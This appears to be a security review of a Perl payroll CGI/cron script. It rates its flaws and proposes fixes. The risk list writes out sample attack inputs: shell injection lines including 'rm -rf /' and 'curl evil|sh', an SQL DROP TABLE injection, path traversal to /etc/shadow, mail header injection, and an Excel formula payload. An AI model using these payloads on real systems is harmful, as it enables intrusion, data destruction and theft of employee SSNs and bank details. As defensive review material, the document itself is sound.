# Analysis: sample_perl.pl

## What It Does

This script is a dual-mode (CGI and cron) payroll tool that connects to an Oracle database holding employee compensation, SSNs, and bank account data. It dispatches on a `?action=` query parameter to six branches:

- `export`: Reads `dept` and `period` from the query string, runs an interpolated `SELECT` against `payroll_records`, writes the result (including SSN, bank account, sort code) to a file under `/var/payroll/exports/` whose name is built from those same parameters, and optionally shells out to `csv2xls` on that path.
- `mail_export`: Reads a recipient, subject, and filename from the query string; opens a pipe to `/usr/sbin/sendmail -t`; writes headers built from raw input; and pipes the contents of `$EXPORT_DIR/$file` into the mail body. The `@corp.local` "check" prints a warning but does not abort.
- `preview`: Passes the `template` query parameter directly to string `eval`.
- `search`: Builds a `SELECT` against `employees` where both the column name (`field`) and search term (`q`) are taken from the query string and interpolated.
- `cleanup`: Runs `find ... -mtime +$days -delete` via backticks with `$days` taken from the query string.
- `audit`: Runs a `SELECT` over `audit_log` with both date bounds interpolated from query parameters.

Hidden behavior: there is no authentication anywhere. The script falls through every branch in sequence (no `elsif`, no `exit`), so a single request can trigger multiple actions if parameters collide. The DB handle holds an account with `DROP TABLE` privilege. `die` calls in CGI mode write filesystem paths and the DBI error string to the HTTP response.

## Risk Flags

- **[Critical]** `eval $tmpl` in the `preview` branch — string `eval` on an unauthenticated query parameter. Arbitrary Perl execution as the web/cron user; full host compromise.
- **[Critical]** `` `find $EXPORT_DIR -mtime +$days ...` `` in `cleanup` — backtick with interpolated query parameter passes through `/bin/sh`. `days=0 -exec rm -rf / \;` or `days=1;curl evil|sh` runs arbitrary shell.
- **[Critical]** `` `csv2xls $outfile 2>&1` `` in `export` — `$outfile` contains the user-controlled `dept` and `period`. Shell metacharacters in either parameter inject commands.
- **[Critical]** SQL injection in `export`: `WHERE dept = '$dept' AND period = '$period'` — interpolated parameters in a query running under an account with DROP privilege. `dept='; DROP TABLE payroll_records--` is fatal.
- **[Critical]** SQL injection in `search`: both `$field` (column name) and `$term` are interpolated. A UNION injection on `$term` exfiltrates any table the account can read; `$field` injection rewrites the WHERE clause entirely.
- **[Critical]** SQL injection in `audit`: `BETWEEN '$from' AND '$to'` with raw query parameters.
- **[Critical]** No authentication on any action. The "runs as cron AND CGI" comment confirms the CGI path has no access control. Every action above is reachable by any unauthenticated HTTP client.
- **[Critical]** Hardcoded DB credentials `payroll_rw` / `Payroll$ummer2k1` in source — the account has read/write/DROP on payroll data. Credentials are visible in any source backup, version-control history, or core dump, and `die` leaks the connection string to the browser.
- **[High]** Path traversal in `mail_export`: `open(F, "$EXPORT_DIR/$file")` with `$file` from the query string. `file=../../etc/shadow` reads root-owned files (subject to process UID) and mails them out.
- **[High]** Path traversal in `export`: `$outfile = "$EXPORT_DIR/${dept}_${period}.$fmt"`. `dept=../../tmp/x` writes payroll CSVs (with SSNs) to arbitrary filesystem locations.
- **[High]** Two-argument `open(F, $path)` in `mail_export` — if `$file` begins with `|`, Perl spawns a shell pipeline instead of opening a file. Combined with the unvalidated `$file`, this is direct command execution.
- **[High]** Two-argument `open(LOG, ">>$LOG")` and `open(OUT, ">$outfile")` — same pipe-open hazard; `$outfile` is built from user input.
- **[High]** Email header injection in `mail_export`: `print MAIL "To: $to\n"` and `Subject: $subject\n`. A `%0ABcc:` in either parameter exfiltrates the payroll attachment to an arbitrary address. Combined with the broken `@corp.local` check (which only warns and falls through), this is unauthenticated PII exfiltration.
- **[High]** `@corp.local` check uses `index() == -1` and does not `exit` or `return` on failure — the email is sent regardless. Also bypassable by `attacker@corp.local.evil.com` since the substring match has no anchor.
- **[High]** Fall-through dispatch: every `if ($action eq ...)` runs independently, with no `elsif` and no `exit`. A single request with conflicting parameters can chain actions, e.g. trigger `cleanup` after `export`.
- **[Medium]** `die "Cannot connect: $DBI::errstr"` and `die "Cannot open $path: $!"` in CGI mode — leaks credentials, internal paths, and Oracle error detail to the browser.
- **[Medium]** CSV output without quoting — names containing commas, quotes, or newlines corrupt the file. A name field set to `=cmd|'/c calc'!A1` is also a CSV-injection vector when opened in Excel.
- **[Medium]** Search output prints SSN and salary with no HTML escaping — stored XSS if any name/dept value contains `<script>`, and direct PII disclosure to any unauthenticated viewer.
- **[Medium]** `close(OUT)`, `close(MAIL)`, `close(F)`, `close(LOG)` return values are ignored — buffered write errors (full disk, broken pipe to sendmail) are silently dropped, so the script reports "Sent." or "Export saved" on failed I/O.
- **[Medium]** Bare global filehandles (`LOG`, `OUT`, `MAIL`, `F`) — not lexically scoped; concurrent requests under mod_perl or persistent runners share state.
- **[Low]** No `use strict` / `use warnings` — typos in variable names silently evaluate to undef; the comment defending this is incorrect (cron mail is suppressible).
- **[Low]** `new CGI` — deprecated indirect-object syntax; behaves as a class method call but parses ambiguously.

## Modernization Path

- Replace string `eval $tmpl` with **Template Toolkit** (`Template->process`) or **Text::Template** with `UNTAINT => 0` and a fixed template directory. Never `eval` HTTP input. (Rewrite scope for the `preview` feature.)
- Replace `` `find ... -mtime +$days ...` `` with `File::Find` plus `unlink`, iterating in Perl with `$days` validated as `\A\d+\z` first. If shelling out is required, use **`IPC::Run`** or `system` with an explicit list form: `system('find', $EXPORT_DIR, '-mtime', "+$days", '-name', '*.csv', '-delete')` after numeric validation of `$days`.
- Replace `` `csv2xls $outfile 2>&1` `` with `IPC::Run3` or `IPC::Open3` passing `['csv2xls', $outfile]` as a list — never a shell string. Validate `$outfile` against `\A\Q$EXPORT_DIR\E/[A-Za-z0-9_.-]+\.csv\z` before invocation.
- Replace every interpolated `prepare(...)` with DBI **placeholders**: `$dbh->prepare("SELECT ... WHERE dept = ? AND period = ?")` then `$sth->execute($dept, $period)`. For `search`, the column name cannot be parameterized — validate `$field` against an explicit whitelist `qw(name dept email emp_id)` and reject anything else; only `$term` goes into a `?` placeholder.
- Add authentication and authorization before any action runs. At minimum, require Apache `Require valid-user` plus a role check on `$ENV{REMOTE_USER}` against an HR group; reject CGI requests entirely if `$ENV{GATEWAY_INTERFACE}` is set and the user lacks payroll role. Split the cron entry point into a separate script that does not parse CGI input. (Rewrite scope.)
- Move DB credentials out of source into a file readable only by the script's UID (e.g. `/etc/payroll/db.conf` mode 0600), loaded via `Config::Tiny`. Reduce `payroll_rw` privileges — remove `DROP` immediately; create a separate DDL account used only by migrations.
- Replace all two-argument `open` with three-argument form: `open(my $fh, '<', $path)`, `open(my $fh, '>', $outfile)`, `open(my $fh, '>>', $LOG)`. This eliminates the pipe-open hazard categorically.
- Validate `$file` in `mail_export` by resolving with `Cwd::abs_path` and rejecting any result that does not begin with `abs_path($EXPORT_DIR) . '/'`. Additionally restrict to `\A[A-Za-z0-9_.-]+\.(csv|xls)\z`.
- Validate `$dept` and `$period` against strict patterns (`\A[A-Z]{2,8}\z` and `\A\d{4}-Q[1-4]\z`) before using them in either filenames or SQL parameters.
- Replace the substring `@corp.local` check with **Email::Address::XS** parsing, then compare the parsed `host` field exactly: `lc($addr->host) eq 'corp.local'`. Reject any address containing CR/LF or multiple `@`. Then `return` or `exit` on failure — not a warning print.
- For mail headers, switch from raw `print MAIL` to **MIME::Lite** or **Email::Sender** with `Email::MIME`: pass `To` and `Subject` as structured fields, which the library encodes and strips of CR/LF. Treat the export as an attachment, not a body inlining.
- Replace `die "...$DBI::errstr"` and `die "...$path..."` in CGI mode with a generic error page; log the detail server-side via `log_action`. Set `RaiseError => 1, PrintError => 0, HandleError => \&safe_handler` on the DBI connect.
- Replace `print OUT join(',', ...)` with **Text::CSV_XS** (`$csv->print($fh, \@row)`) to handle quoting, embedded commas, and embedded newlines correctly. Prefix any cell beginning with `=`, `+`, `-`, `@` with a single quote to neutralize Excel formula injection.
- HTML-escape all search output: `use HTML::Entities; print encode_entities($value)`. Better: stop returning SSN and full salary from a search endpoint at all — mask SSN to last four digits and require a separate authorized endpoint for full disclosure.
- Convert the fall-through `if ($action eq ...)` chain to a dispatch table: `my %actions = (export => \&do_export, ...); $actions{$action}->() or http_404();`. Eliminates accidental chaining.
- Check `close($fh)` return value on every write filehandle, especially the sendmail pipe: `close($mail) or die "sendmail pipe failed: $! / $?"` — for a pipe-close, `$?` carries sendmail's exit status.
- Add `use strict; use warnings;` at the top. The "noise in cron mail" objection is solved by `2>/dev/null` on the cron line or by configuring `STDERR` redirection — do not omit strict on a script that handles SSNs.
- Replace `new CGI` with `CGI->new` (or migrate to **Plack/PSGI** with `Plack::Request` for any new development — `CGI.pm` has been distribution-removed since Perl 5.22). (Rewrite scope for the CGI front-end as a whole.)
